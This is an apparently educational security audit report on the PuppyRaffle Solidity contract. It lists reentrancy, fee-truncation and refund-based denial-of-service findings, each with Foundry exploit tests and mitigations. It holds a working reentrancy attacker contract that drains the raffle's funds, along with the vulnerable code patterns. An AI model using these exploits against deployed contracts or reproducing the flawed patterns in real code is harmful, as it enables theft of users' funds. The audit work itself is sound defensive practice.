# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

# Puppy Raffle Protocol

PuppyRaffle is an ERC721 raffle where users buy entries to win a puppy NFT. Participants call enterRaffle(address[]), paying entranceFee per address; duplicate addresses are rejected. Players can call refund to remove themselves and reclaim their ticket value before the draw.

The raffle operates in rounds of raffleDuration starting at raffleStartTime. Once a round ends, anyone may call selectWinner to randomly choose a winner from active players, mint the puppy NFT with rarity metadata (common/rare/legendary), send the pot minus fees to the winner, and accrue fees to feeAddress. The owner can changeFeeAddress and withdrawFees. Token metadata is served via tokenURI and a base URI mapping.

Deployment script configures entranceFee (1 ether), feeAddress (deployer by default), and duration (1 day). Tests validate entering (single/many), duplicate prevention, refunds, active index lookups, winner selection/prize payout, and fee withdrawals.

Specs:
- Solidity 0.7.6
- Network: Ethereum
- Roles: Owner (admin), Player (entrant)
## High Risk Findings
[H-1]. Reentrancy in PuppyRaffle.refund lets a malicious entrant drain the entire pot via recursive refunds - check
[H-2]. uint64 downcast in selectWinner overflows fees, desyncs accounting and permanently bricks withdrawFees - check
## Medium Risk Findings
[M-1]. Refund-created duplicate zero addresses brick enterRaffle and wedge the raffle round (permanent DoS) - check
[M-2]. Refunded entries still counted inflate pot/fees and brick PuppyRaffle.selectWinner - check should be HIGH ?


### Number of Findings
- C: 0
- H: 2
- M: 2
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Reentrancy in PuppyRaffle.refund lets a malicious entrant drain the entire pot via recursive refunds

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
Reentrancy

## Description
The refund function sends ETH to msg.sender before clearing their slot in players, enabling reentrancy. Because players[playerIndex] remains equal to msg.sender during the external call, a malicious recipient contract can re-enter refund(playerIndex) repeatedly and receive entranceFee multiple times in the same transaction, draining all funds held for the current raffle. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, ...);
    require(playerAddress != address(0), ...);

    // External call before state update (reentrancy!)
    payable(msg.sender).sendValue(entranceFee);

    // State updated after external call
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}


## Impact
An attacker who has an active player slot can re-enter refund multiple times to withdraw entranceFee repeatedly, draining the contract’s entire ETH balance (all participants’ funds for the round) in a single transaction. This is a direct, permissionless theft of raffle funds.

## Proof of Concept
1) Attacker deploys a malicious contract with a receive() that, upon receiving ETH, calls refund(playerIndex) again while the players[playerIndex] is still attacker.
2) Victims (or any payer) enter the raffle, funding the pot (e.g., 3 victims + attacker).
3) Attacker calls refund(index) once from the malicious contract. The first sendValue triggers the receive() which re-enters refund(index) multiple times before the state is cleared.
4) Each re-entrant call pays out entranceFee again. The loop continues until the attacker’s counter stops or the pot is drained.
5) End result: contract balance drained to zero, attacker net profit equals total pot minus any amount they may have funded.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RefundReentrancyExploitTest is Test {
    PuppyRaffle raffle;
    Attacker attacker;

    address sponsor = address(0xBEEF);
    address v1 = address(0x1111);
    address v2 = address(0x2222);
    address v3 = address(0x3333);
    address attackerEOA = address(0xA11CE);

    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xFEE), 1 days);
        attacker = new Attacker(raffle);

        vm.deal(sponsor, 100 ether);
        vm.deal(attackerEOA, 1 ether);

        address[] memory players = new address[](4);
        players[0] = v1;
        players[1] = v2;
        players[2] = v3;
        players[3] = address(attacker);

        // Any payer can fund entries for arbitrary addresses
        vm.prank(sponsor);
        raffle.enterRaffle{value: 4 ether}(players);

        // Attacker is at index 3 (0-based)
        attacker.setPlayerIndex(3);

        // Ensure attacker contract starts with 0 for clear profit calc
        vm.deal(address(attacker), 0);
    }

    function testExploit_refundReentrancyDrainsPot() public {
        uint256 potBefore = address(raffle).balance; // should be 4 ether
        uint256 attackerBefore = address(attacker).balance; // 0
        assertEq(potBefore, 4 ether);
        assertEq(attackerBefore, 0);

        // Attacker (EOA) triggers the malicious contract to attack
        vm.prank(attackerEOA);
        attacker.attack();

        uint256 potAfter = address(raffle).balance;
        uint256 attackerAfter = address(attacker).balance;

        // Entire pot drained and credited to attacker contract via reentrancy
        assertEq(potAfter, 0);
        assertGt(attackerAfter, attackerBefore);
        // With 3 reentries + initial call => 4x entranceFee received
        assertEq(attackerAfter, 4 ether);
    }
}

contract Attacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public reentrancyCount = 3; // 3 re-entries + 1 outer = 4 total refunds
    bool internal attacking;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function setPlayerIndex(uint256 _idx) external {
        idx = _idx;
    }

    function attack() external {
        attacking = true;
        raffle.refund(idx); // initial call, triggers sendValue -> receive -> reenter
        attacking = false;
    }

    receive() external payable {
        if (attacking && reentrancyCount > 0) {
            reentrancyCount--;
            raffle.refund(idx);
        }
    }
}


## Suggested Mitigation
Apply Checks-Effects-Interactions and/or a nonReentrant guard. Update state before transferring ETH, and prefer using call with CEI. Example fix:

// SPDX-License-Identifier: MIT
// pragma solidity ^0.7.6;
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

// contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard { ... }
function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Effects first
    players[playerIndex] = address(0);

    // Interaction after state update
    (bool ok, ) = payable(playerAddress).call{value: entranceFee}("");
    require(ok, "PuppyRaffle: Refund failed");
    emit RaffleRefunded(playerAddress);
}



## [H-2]. uint64 downcast in selectWinner overflows fees, desyncs accounting and permanently bricks withdrawFees

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
PuppyRaffle stores fees in a uint64 and downcasts the per-round fee (uint256) before adding, with unchecked arithmetic (Solidity 0.7). For large rounds (fee > 2^64−1 wei ≈ 18.4467 ETH) or cumulative additions, totalFees wraps/truncates:

Vulnerable snippet:

function selectWinner() external {
    ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee); // truncation + wrap in 0.7
    ...
}

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

When a single round’s fee exceeds uint64 max (e.g., 100 entries at 1 ETH creates a 20 ETH fee), uint64(fee) truncates modulo 2^64 and totalFees becomes smaller than the actual ETH left in the contract. The strict gate address(this).balance == totalFees will never be satisfied thereafter, permanently locking the treasury fees.

## Impact
Permanent, permissionless freezing of protocol fees. Any user can create a round whose 20% fee > 2^64−1 wei (≈18.4467 ETH), causing totalFees to under-report and making withdrawFees revert forever. Treasury funds become unrecoverable without a migration/upgrade.

## Proof of Concept
1) Attacker crafts a round with >= 93 unique addresses at 1 ETH entranceFee (total 100 ETH is used in PoC).
2) Call enterRaffle() paying 100 ETH.
3) After duration, call selectWinner(). Contract sends 80 ETH to winner, leaving 20 ETH as fees.
4) Due to uint64 downcast, totalFees records 20 ETH mod 2^64, which truncates to a smaller value (< 20 ETH).
5) withdrawFees checks address(this).balance == totalFees and reverts. Fees (20 ETH) are permanently stuck.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FeeOverflowTest is Test {
    PuppyRaffle internal raffle;
    address internal attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 200 ether);
        // entranceFee = 1 ether, feeAddress arbitrary, raffleDuration = 1 day
        raffle = new PuppyRaffle(1 ether, address(0xFEED), 1 days);
    }

    function testFeeOverflowBricksWithdraw() public {
        // Arrange: build 100 unique players so fee = 20 ETH (> 2^64-1 wei ~ 18.4467 ETH)
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 1));
        }

        vm.prank(attacker);
        raffle.enterRaffle{value: 100 ether}(players);

        // Act: advance time and select winner
        vm.warp(block.timestamp + 1 days + 1);
        vm.prank(attacker);
        raffle.selectWinner();

        // Assert: contract holds 20 ETH in fees, but totalFees was truncated due to uint64 downcast
        uint256 bal = address(raffle).balance;
        uint256 tf = uint256(raffle.totalFees());
        assertEq(bal, 20 ether, "Contract should retain 20 ETH fees after payout");
        assertLt(tf, bal, "totalFees should be less than actual balance due to uint64 truncation");
        assertTrue(tf != bal, "Invariant broken: balance != totalFees");

        // withdrawFees permanently reverts due to strict equality check
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Fees remain stuck
        assertEq(address(raffle).balance, 20 ether, "Fees remain frozen in contract");
    }
}


## Suggested Mitigation
Use a wide type and checked math; avoid truncation and fragile balance equality gates. Example fix for 0.7.x:

- Change storage type:
  uint64 public totalFees;  ->  uint256 public totalFees;

- Use SafeMath (or upgrade to 0.8+ for checked arithmetic):
  using SafeMath for uint256;
  // in selectWinner
  totalFees = totalFees.add(fee);

- In withdrawFees, avoid strict balance equality as a proxy for "no active players". Instead, gate on players.length == 0 and only require balance >= totalFees:

function withdrawFees() external {
    require(players.length == 0, "Raffle active");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool ok,) = feeAddress.call{value: feesToWithdraw}("");
    require(ok, "PuppyRaffle: Failed to withdraw fees");
}

This preserves accounting invariants and prevents bricking due to overflows/truncation.




# Medium Risk Findings

## [M-1]. Refund-created duplicate zero addresses brick enterRaffle and wedge the raffle round (permanent DoS)

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
StateMachine

## Description
State machine invariant says only non-zero addresses must be unique. However, enterRaffle enforces global uniqueness across all entries, including address(0) slots left by refunds. This blocks valid state transitions after refunds and can permanently wedge the round.

Vulnerable snippet in PuppyRaffle.enterRaffle:

for (uint256 i = 0; i < players.length - 1; i++) {
  for (uint256 j = i + 1; j < players.length; j++) {
    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
  }
}

Because refunds set players[playerIndex] = address(0), two or more refunds create duplicate zero entries. The duplicate check does not skip address(0), so any subsequent enterRaffle call reverts, even with unique non-zero players. This violates the intended state machine (allow multiple zeros yet no duplicate non-zero players) and enables an unprivileged attacker to wedge the system.

## Impact
Permissionless, repeatable DoS of core flows. With at least two refunds, enterRaffle always reverts due to duplicate address(0) entries. Even a single refund causes selectWinner to revert because totalAmountCollected is derived from players.length (includes refunded slots) while the actual balance is lower, making prizePool unaffordable. Existing players can still self-refund (no permanent user fund lock), but the round cannot progress (no new entrants, no winner selection) and fee withdrawal remains blocked by design until state is repaired or the contract is replaced.

## Proof of Concept
1) Attacker and a few honest users enter a round (>= 4 entries).
2) Attacker refunds two of their own entries, leaving players like [0x0, 0x0, userC, userD].
3) Now, any new unique player attempting to enter causes enterRaffle to compare address(0) against address(0) and revert 'Duplicate player'. Deposits are blocked.
4) After raffleDuration, selectWinner computes totalAmountCollected = players.length * entranceFee (overcounting zero entries), so prizePool > contract balance. The ETH transfer to the winner fails and selectWinner reverts, wedging the raffle.
5) Fees cannot be withdrawn (address(this).balance != totalFees) and no one can proceed, requiring manual state repair.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract StateMachine_DuplicateZero_DoS_Test is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address feeAddress = address(777);
    uint256 constant DURATION = 1 days;

    address attacker;
    address attackerAlt;
    address userC;
    address userD;
    address userE;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeAddress, DURATION);
        attacker = makeAddr("attacker");
        attackerAlt = makeAddr("attackerAlt");
        userC = makeAddr("userC");
        userD = makeAddr("userD");
        userE = makeAddr("userE");

        vm.deal(attacker, 10 ether);
        vm.deal(attackerAlt, 10 ether);
        vm.deal(userC, 10 ether);
        vm.deal(userD, 10 ether);
        vm.deal(userE, 10 ether);
    }

    function _enterAs(address p) internal {
        address[] memory arr = new address[](1);
        arr[0] = p;
        vm.prank(p);
        raffle.enterRaffle{value: FEE}(arr);
    }

    function test_DoS_via_DuplicateZeroAndPrizeInflation() public {
        // Arrange: 4 unique entrants
        _enterAs(attacker);    // index 0
        _enterAs(attackerAlt); // index 1
        _enterAs(userC);       // index 2
        _enterAs(userD);       // index 3
        assertEq(address(raffle).balance, 4 ether);

        // Act: attacker creates two zero slots via refunds
        vm.prank(attacker);
        raffle.refund(0); // players[0] = address(0)
        vm.prank(attackerAlt);
        raffle.refund(1); // players[1] = address(0)

        // Balance now only from userC & userD
        assertEq(address(raffle).balance, 2 ether);

        // Fast-forward to end of raffle to try selecting winner
        vm.warp(block.timestamp + DURATION + 1);

        // selectWinner uses players.length (=4) to compute prizePool=3.2 ETH > 2 ETH balance -> revert
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Any new entry is also blocked due to duplicate address(0) entries
        address[] memory arr = new address[](1);
        arr[0] = userE;
        vm.prank(userE);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: FEE}(arr);

        // Assert funds are stuck (no change in balance after failed calls)
        assertEq(address(raffle).balance, 2 ether);
    }
}


## Suggested Mitigation
Address both facets: (A) remove or ignore refunded slots to avoid duplicate-zero DoS; (B) compute prize/fees from actual collected funds or active players only. Options:
- Swap-and-pop on refund to keep the array compact (no zeros):
  refund(index): require(players[index] == msg.sender && players[index] != address(0)); send back entranceFee; if (index != players.length-1) players[index] = players[players.length-1]; players.pop();
  Also enforce non-zero entrants and no duplicates at insertion time (mapping(address=>bool) isActive) to avoid O(n^2) scans.
- Alternatively, keep zeros but skip address(0) in duplicate checks AND base prize/fee on actual accounting: maintain totalCollected that increases by msg.value on enter and decreases by entranceFee on refund; compute prizePool = totalCollected * 80 / 100 and fee = totalCollected * 20 / 100 at selection; choose winner from non-zero players only (build a temporary active array or track active count). Also add require(newPlayers[k] != address(0)) when entering.


## [M-2]. Refunded entries still counted inflate pot/fees and brick PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
Refunded players are nulled to address(0) but still counted via players.length. selectWinner derives the pot/fees from players.length instead of the number of active (non-zero) entries or the contract balance. This breaks the conservation invariant between contract balance and computed payouts, underfunding the prize and reverting the prize transfer, permanently bricking winner selection until more deposits arrive.

Vulnerable snippets:

function refund(uint256 playerIndex) public {
    ...
    players[playerIndex] = address(0);
}

function selectWinner() external {
    ...
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    ...
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
}

Example: 4 players deposit 4*fee. Two refund, leaving balance 2*fee but players.length still 4. selectWinner computes prizePool=3.2*fee, fee=0.8*fee while balance is 2*fee. The value transfer fails and reverts, blocking the round.

## Impact
Permissionless, repeatable DoS of winner selection. Any player can refund after entries are sold to reduce balance below computed prize, causing selectWinner to revert. This freezes NFT issuance, payout, and round progression until fresh funds are added, affecting all participants.

## Proof of Concept
1) Attacker causes at least 4 unique players to enter (4*fee in contract).
2) Two players call refund(), receiving 2*fee back; contract now holds 2*fee but players.length remains 4 due to zeroed slots.
3) After raffleDuration, anyone calls selectWinner(). prizePool is computed as 80% of 4*fee (3.2*fee) while balance is 2*fee. The value transfer fails and selectWinner reverts, bricking the round.
4) The state remains stuck unless more entrants add funds to cover the inflated computed pot.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AccountingInvariantDosTest is Test {
    PuppyRaffle raffle;
    address attacker = address(0xBEEF);
    address a = address(0xA1);
    address b = address(0xB2);
    address c = address(0xC3);
    address d = address(0xD4);
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEED), DURATION);
    }

    function test_DoS_selectWinner_bricked_by_refunds() public {
        // Arrange: 4 players enter paying 4 * FEE
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = a;
        newPlayers[1] = b;
        newPlayers[2] = c;
        newPlayers[3] = d;
        raffle.enterRaffle{value: 4 * FEE}(newPlayers);

        // Two players refund, creating holes (address(0)) but leaving players.length == 4
        vm.prank(a);
        raffle.refund(0);
        vm.prank(b);
        raffle.refund(1);

        // Only 2 * FEE remains in the contract
        assertEq(address(raffle).balance, 2 * FEE, "balance should equal remaining active deposits");

        // Act: Raffle time passed, attempt to select winner
        vm.warp(block.timestamp + DURATION);
        vm.prank(attacker);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Fix by keeping the players array tightly packed so players.length reflects the true active count and no zero-address can be selected. Use swap-and-pop in refund and compute the pot from players.length * entranceFee (not from address(this).balance). Additionally, update state before external transfers (checks-effects-interactions). Example:

function refund(uint256 idx) external {
    address player = players[idx];
    require(player == msg.sender && player != address(0), "PuppyRaffle: not active");
    uint256 last = players.length - 1;
    if (idx != last) {
        players[idx] = players[last];
    }
    players.pop();
    payable(msg.sender).sendValue(entranceFee);
}

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];

    uint256 totalAmountCollected = players.length * entranceFee; // invariant-safe with packed array
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = totalAmountCollected - prizePool;
    totalFees += uint64(fee);

    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;

    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, totalSupply());
}

Alternatively, track a dedicated currentRoundPot variable: increment by entranceFee * newPlayers.length on enter, decrement by entranceFee on refund, and base prize/fee on currentRoundPot. Do not base pot on address(this).balance unless you immediately transfer fees out each round or ensure totalFees is zero before the next round (which changes protocol design).




